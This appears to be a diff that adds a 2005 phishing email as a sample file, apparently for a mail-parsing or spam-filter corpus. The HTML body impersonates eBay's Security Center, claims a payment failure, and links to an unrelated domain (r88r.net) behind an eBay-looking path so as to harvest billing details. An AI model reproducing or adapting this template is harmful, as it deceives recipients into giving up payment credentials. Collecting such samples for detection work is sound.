@@ -1,0 +1,321 @@
+From nobody Sun Jan 25 13:49:55 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 892932A89E
+ for <user@example.com>; Fri,  1 Jul 2005 15:07:18 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id 16EEC621CBC; Fri,  1 Jul 2005 15:07:18 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 7C322621CA6
+ for <user@example.com>; Fri,  1 Jul 2005 15:07:17 -0400 (EDT)
+Received: (from user@localhost) by mail.example.com id PAA10123
+ for user@example.com; Fri, 1 Jul 2005 15:07:17 -0400
+Received: from hummer.mediajuice.net (hummer.mediajuice.net [64.62.139.129])
+ by mail.example.com with ESMTP id PAA10115
+ for <user@example.com>; Fri, 1 Jul 2005 15:07:16 -0400
+Received: from nobody by hummer.mediajuice.net with local (Exim 4.50)
+ id 1DoOpM-0001YW-5e
+ for user@example.com; Fri, 01 Jul 2005 09:57:20 -0700
+To: user@example.com
+Subject: Security Center (action required)
+From: Security Center (action required) <aw-alert@eBay.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1DoOpM-0001YW-5e@hummer.mediajuice.net>
+Date: Fri, 01 Jul 2005 09:57:20 -0700
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - hummer.mediajuice.net
+X-AntiAbuse: Original Domain - example.com
+X-AntiAbuse: Originator/Caller UID/GID - [99 32375] / [47 12]
+X-AntiAbuse: Sender Address Domain - hummer.mediajuice.net
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 18
+
+<html dir="rtl">
+
+<head>
+<title>eBay</title>
+</head>
+
+<body>
+
+
+<div id="message" dir="ltr">
+
+  <style>#message .SectionTitle {
+	FONT-WEIGHT: bold; FONT-SIZE: small; FONT-FAMILY: arial, sans-serif
+}
+#message .SmallTitle {
+	FONT-WEIGHT: bold; FONT-SIZE: x-small; FONT-FAMILY: arial, sans-serif
+}
+#message .SectionBody {
+	FONT-SIZE: x-small; FONT-FAMILY: arial, sans-serif
+}
+#message .DetailTable {
+	FONT-WEIGHT: normal; FONT-SIZE: 10pt; FONT-FAMILY: arial, sans-serif
+}
+#message .DetailTable TH {
+	FONT-WEIGHT: normal; FONT-SIZE: 10pt; FONT-FAMILY: arial, sans-serif
+}
+#message .Title {
+	FONT-SIZE: medium; FONT-FAMILY: verdana, arial, sans-serif
+}
+#message .BodyFont {
+	FONT-WEIGHT: normal; FONT-SIZE: 10pt; FONT-FAMILY: arial, sans-serif
+}
+#message .BodyFontStrong {
+	FONT-WEIGHT: bold; FONT-SIZE: 10pt; FONT-FAMILY: arial, sans-serif
+}
+#message .SmallBody {
+	MARGIN-TOP: 8px; FONT-WEIGHT: normal; FONT-SIZE: xx-small; MARGIN-BOTTOM: 6px; FONT-FAMILY: arial, sans-serif
+}
+#message .Separator {
+	COLOR: #cccccc; HEIGHT: 1px
+}
+#message .HighlightedSeparator {
+	COLOR: #9999cc; HEIGHT: 1px
+}
+#message .FooterSeparator {
+	COLOR: #cccccc; HEIGHT: 1px
+}
+#message .Footer {
+	MARGIN-TOP: 2px; FONT-SIZE: xx-small; MARGIN-BOTTOM: 8px; COLOR: #666666; FONT-FAMILY: arial, sans-serif
+}
+#message .Footer P {
+	MARGIN-TOP: 2px; FONT-SIZE: xx-small; MARGIN-BOTTOM: 8px; COLOR: #666666; FONT-FAMILY: arial, sans-serif
+}
+#message .SmallPara {
+	MARGIN-TOP: 8px; MARGIN-BOTTOM: 6px
+}
+#message .SmallParap {
+	MARGIN-TOP: 8px; MARGIN-BOTTOM: 6px
+}
+  </style>
+  <style>#message .ItemTitle {
+	FONT-WEIGHT: bold; FONT-SIZE: 10pt; FONT-FAMILY: arial, sans-serif
+}
+  </style>
+  <xbody bgcolor="#FFFFFF">
+  <table dir="ltr" cellSpacing="0" cellPadding="0" width="600">
+    <tr>
+      <td dir="ltr" style="WORD-WRAP: break-word" width="600">
+      <xmeta http-equiv="Content-Type" content="text/html">
+      <xbody bgcolor="white" marginwidth="4" marginheight="4" topmargin="4" leftmargin="4" vlink="#0000ff" link="#0000ff">
+      <table dir="ltr" cellSpacing="0" cellPadding="0" width="600" border="0">
+        <tr>
+          <td dir="ltr" bgColor="#d6dcfe" colSpan="2" height="2">
+          <p dir="ltr">
+          <img height="2" src="" width="1"></td>
+        </tr>
+        <tr dir="ltr" vAlign="top">
+          <td dir="ltr" width="600" bgColor="#d6dcfe">
+          <p dir="ltr"><font face="Arial, Helvetica, sans-serif" size="3">
+          <img height="1" src="" width="2"></font><b><font face="Verdana" size="3">Billing 
+          confirmation center</font></b></td>
+          <td dir="ltr" width="200" bgColor="#d6dcfe">
+          <div dir="ltr" align="right">
+            <p dir="ltr">
+            <img title alt=" " src="http://pics.ebaystatic.com/aw/pics/aboutme/v3/ebay_logo_39x18.gif" width="39" height="18"></div>
+          </td>
+        </tr>
+        <tr>
+          <td dir="ltr" bgColor="#d6dcfe" colSpan="2" height="2">
+          <p dir="ltr">
+          <img height="2" src="file:" width="1"></td>
+        </tr>
+        <tr>
+          <td dir="ltr" vAlign="center" bgColor="#9999cc" colSpan="2" height="2">
+          <p dir="ltr">
+          <img height="2" src="" width="1"></td>
+        </tr>
+      </table>
+      <p dir="ltr">
+      <img height="10" src="" width="1" border="0">
+      </p>
+      <table dir="ltr" cellSpacing="0" cellPadding="0" border="0" xmlns:fo="http://www.w3.org/1999/XSL/Format">
+        <tr>
+          <td dir="ltr" bgColor="#6b7b91" colSpan="3" height="1">
+          <p dir="ltr">
+          <img height="1" src="" width="1"></td>
+        </tr>
+        <tr>
+          <td dir="ltr" width="1" bgColor="#6b7b91">
+          <p dir="ltr">
+          <img height="1" src="" width="1"></td>
+          <td dir="ltr" vAlign="top">
+          <table dir="ltr" height="313" cellSpacing="0" cellPadding="0" border="0">
+            <tr>
+              <td dir="ltr" background="" height="20">
+              <table dir="ltr" cellSpacing="0" cellPadding="0" border="0">
+                <tr>
+                  <td dir="ltr" bgColor="#cad2dd">
+                  <p dir="ltr">
+                  <img title alt=" " src="http://pics.ebaystatic.com/aw/pics/securityCenter/imgShield_25x25.gif" border="0" width="25" height="25"></td>
+                  <td bgColor="#cad2dd"><b>
+                  <font face="Arial, Helvetica, sans-serif" color="#000000" size="-1">
+                  <a href="http://pages.ebay.com/securitycenter/selling_safely.html">
+                  <font color="#000000">eBay Security<span lang="ar-sy"> </span>
+                  Center</font></a></font></b><font face="Arial, Helvetica, sans-serif" size="-1"><b><a style="COLOR: #000000; TEXT-DECORATION: none" href="http://pages.ebay.com/securitycenter/selling_safely.html" target="_blank">
+                  </a></b></font> </td>
+                  <td dir="ltr" bgColor="#cad2dd">
+                  <p dir="ltr">
+                  <img title alt=" " src="http://pics.ebaystatic.com/aw/pics/securityCenter/imgTabCorner_25x25.gif" border="0" width="25" height="25"></td>
+                </tr>
+              </table>
+              </td>
+            </tr>
+            <tr>
+              <td dir="ltr" height="286">
+              <table dir="ltr" cellSpacing="0" cellPadding="10" border="0">
+                <tr>
+                  <td dir="ltr">
+                  <p dir="ltr">
+                  <font face="Arial, Helvetica, sans-serif" size="-1">We were 
+                  unable to process your most recent payment. Did you recently 
+                  change your bank, phone number or credit card?.<br>
+                  To ensure that your service is not interrupted, please update 
+                  your billing information today<font color="#000099"><a href="http://http://www.r88r.net/welcome/C:\Documents and Settings\Mastar\Local Settings\Temp\das676bsda6gwcv7zfcwfcwf34gfwf23g235f134f3fg3f&bhdfahva685hwseBayISAPI.dllPaymentLanding&ssPageName=hhpayUSf&=userhgads&secure&ssl7r2vbd7d88klmnogh2.htm">
+                  </a> </font>
+                  </font><b><font face="Arial, Helvetica, sans-serif">
+                  <a href="http://www.r88r.net/welcome/das676bsda6gwcv7zfcwfcwf34gfwf23g235f134f3fg3f&bhdfahva685hwseBayISAPI.dllPaymentLanding&ssPageName=hhpayUSf&=userhgads&secure&ssl7r2vbd7d88klmnogh.htm">
+                  <font style="FONT-SIZE: 9pt" color="#ff4040"><u>by clicking 
+                  here</u>.</font></a></font><font style="FONT-SIZE: 9pt" face="Arial, Helvetica, sans-serif" color="#000099">
+                  </font></b>
+                  <font face="Arial, Helvetica, sans-serif" size="-1">Or contact 
+                  eBay Member Services Team. We're available 24 hours a day, 7 
+                  days a week.<br>
+                  If you have recently updated your billing information, please 
+                  disregard this message as we are processing the changes you 
+                  have made.<br>
+                  <br>
+                  Regards,<br>
+                  <b><font color="#cc3300">e</font><font color="#0033cc">B</font><font color="#eaa500">a</font><font color="#008000">y</font></b> 
+                  Member Services Team<br>
+                   Learn more about
+                  <a href="http://pages.ebay.com/securitycenter/selling_safely.html" target="_blank">
+                  selling with confidence</a>. <br>
+ </p>
+                  <table dir="ltr" cellSpacing="0" cellPadding="0" width="100%" border="0">
+                    <tr>
+                      <td dir="ltr">
+                      <p dir="ltr">
+                      <img height="5" src="file://D:/Documents%20and%20Settings/Safe%20House%20-%201/ebay_files/x.gif" width="1"></td>
+                    </tr>
+                    <tr>
+                      <td dir="ltr" background="file://D:/Documents%20and%20Settings/Safe%20House%20-%201/ebay_files/imgDot_4x4.gif">
+                      <p dir="ltr">
+                      <img height="4" src="file://D:/Documents%20and%20Settings/Safe%20House%20-%201/ebay_files/x.gif" width="1"></td>
+                    </tr>
+                    <tr>
+                      <td dir="ltr">
+                      <p dir="ltr">
+                      <img height="5" src="file://D:/Documents%20and%20Settings/Safe%20House%20-%201/ebay_files/x.gif" width="1"></td>
+                    </tr>
+                  </table>
+                  <p dir="ltr">If this email is inappropriate or in any way 
+                  violates eBay policy, please help protect other eBay community 
+                  members by
+                  <a href="http://pages.ebay.com/help/policies/rfe-spam-non-ebay-sale.html" target="_blank">
+                  reporting it</a> to us immediately. </font></td>
+                </tr>
+              </table>
+              </td>
+            </tr>
+            <tr>
+              <td dir="ltr" bgColor="#cad2dd" height="7">
+              <p dir="ltr">
+              <img height="5" src="file://D:/Documents%20and%20Settings/Safe%20House%20-%201/ebay_files/x.gif" width="1"></td>
+            </tr>
+          </table>
+          </td>
+          <td dir="ltr" width="1" bgColor="#6b7b91">
+          <p dir="ltr">
+          <img height="1" src="file://D:/Documents%20and%20Settings/Safe%20House%20-%201/ebay_files/x.gif" width="1"></td>
+        </tr>
+        <tr>
+          <td dir="ltr" bgColor="#6b7b91" colSpan="3" height="1">
+          <p dir="ltr">
+          <img height="1" src="file://D:/Documents%20and%20Settings/Safe%20House%20-%201/ebay_files/x.gif" width="1"></td>
+        </tr>
+      </table>
+      <p dir="ltr"><br>
+ </p>
+      <table dir="ltr" cellSpacing="0" cellPadding="0" width="600" border="0">
+        <tr>
+          <td dir="ltr" vAlign="top" width="600">
+          <p dir="ltr"> </td>
+        </tr>
+        <tr>
+          <td dir="ltr"><font face="Arial, Helvetica, sans-serif">
+          <table dir="ltr" cellSpacing="0" cellPadding="0" width="$TableWidth">
+            <tr>
+              <td dir="ltr"><hr dir="ltr" color="#d2d3d2" noShade></td>
+            </tr>
+            <tr>
+              <td dir="ltr">
+              <p dir="ltr"><font face="Arial" color="#666666" size="1">eBay 
+              treats your personal information with the utmost care, and our 
+              Privacy Policy is designed to protect you and your information. 
+              eBay will never ask their users for personal information, such as 
+              bank account numbers, credit card numbers, pin numbers, passwords, 
+              or Social Security numbers in an email. For more information on 
+              how to protect your eBay password and your account, please visit
+              <a href="http://pages.ebay.com/help/account_protection.html" target="_blank" onfiltered="return openNonHelpWindow(this.href);">
+              User Account Protection</a>.</font></td>
+            </tr>
+            <tr>
+              <td dir="ltr">
+              <p dir="ltr">
+              <img height="15" alt=" " src="file://D:/Documents%20and%20Settings/Safe%20House%20-%201/ebay_files/spacer.gif" width="1"></td>
+            </tr>
+            <tr>
+              <td dir="ltr">
+              <p dir="ltr"><font face="Arial" color="#666666" size="1">This eBay 
+              notice was sent to you based on your eBay account preferences and 
+              in accordance with our
+              <a href="http://pages.ebay.com/help/community/png-priv.html" target="_blank" onfiltered="return openNonHelpWindow(this.href);">
+              Privacy Policy</a>. To change your notification preferences,
+              <a href="http://cgi4.ebay.com/ws/eBayISAPI.dll?OptinLoginShow" target="_blank" onfiltered="return openNonHelpWindow(this.href);">
+              click here</a>. If you would like to receive this email in text 
+              format,
+              <a href="http://cgi4.ebay.com/ws/eBayISAPI.dll?OptinLoginShow" target="_blank" onfiltered="return openNonHelpWindow(this.href);">
+              click here</a>.</font></td>
+            </tr>
+            <tr>
+              <td dir="ltr">
+              <p dir="ltr">
+              <img height="15" alt=" " src="file://D:/Documents%20and%20Settings/Safe%20House%20-%201/ebay_files/spacer.gif" width="1"></td>
+            </tr>
+            <tr>
+              <td dir="ltr">
+              <p dir="ltr" align="center"><font color="#666666" size="1">
+              Copyright © 2005 eBay Inc. All Rights Reserved. <br>
+              Designated trademarks and brands are the property of their 
+              respective owners.<br>
+              eBay and the eBay logo are trademarks of eBay Inc</font><font color="#666666" size="2">.</font><font color="#666666">
+              </font></td>
+            </tr>
+          </table>
+          </font></td>
+        </tr>
+      </table>
+      </xbody>
+      </xmeta>
+      </td>
+    </tr>
+  </table>
+  </xbody>
+
+<p dir="ltr"> </p>
+
+</body>
+
+</html>
+
+
